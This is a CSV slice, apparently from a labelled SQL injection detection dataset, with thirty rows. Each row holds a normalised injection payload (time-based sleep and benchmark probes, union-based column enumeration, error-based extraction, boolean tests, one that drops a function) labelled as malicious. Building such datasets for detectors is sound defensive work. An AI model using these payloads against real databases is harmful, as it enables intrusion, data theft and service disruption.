row_index,payload_norm,label,sqli_type_hint
840,"1%"" or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
841,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""pawh"" = ""pawh",1,
842,( 1589 = 1589 ) *1,1,
843,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 7240 = 7240",1,
844,1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 9548 = 9548,1,
845,1 ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 6406 = 6406,1,
846,-5021'+ ( select yadq where 4285 = 4285 order by 1#,1,
847,1%' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and '%' = ',1,
848,"1"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""baia"" = ""baia",1,
849,"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""jozh"" = ""jozh",1,
850,"-9508 ) union all select 9950,9950,9950,9950,9950,9950,9950#",1,
851,"1 ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
852,"-1064' or make_set ( 6439 = 2937,2937 ) and 'qojd' = 'qojd",1,
853,1' ) as rbpx where 1264 = 1264,1,
854,"1%' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( '%' = '",1,
855,if ( 8284 = 6171 ) select 8284 else drop function mbih--,1,
856,1 ) ) or sleep ( 5 ) #,1,
857,"-7868"" ) ) or 9323 = 9323#",1,
858,"1' ) as ekjw where 5477 = 5477 union all select null,null,null,null,null--",1,
859,"1"" where 2462 = 2462 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
860,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'mfib' = 'mfib",1,
861,1 ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
862,1%' and 4595 = 4595#,1,
863,1' ) as oknw where 8777 = 8777,1,
864,"1"" where 6501 = 6501",1,
865,"1 ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 8929 = 8929",1,
866,-7999 ) or 8422 = 1336,1,
867,-5742' where 1314 = 1314 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
868,"1 ) ) as potk where 5040 = 5040 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
869,"-4605"" ) union all select 8542,8542,8542,8542,8542,8542,8542,8542--",1,
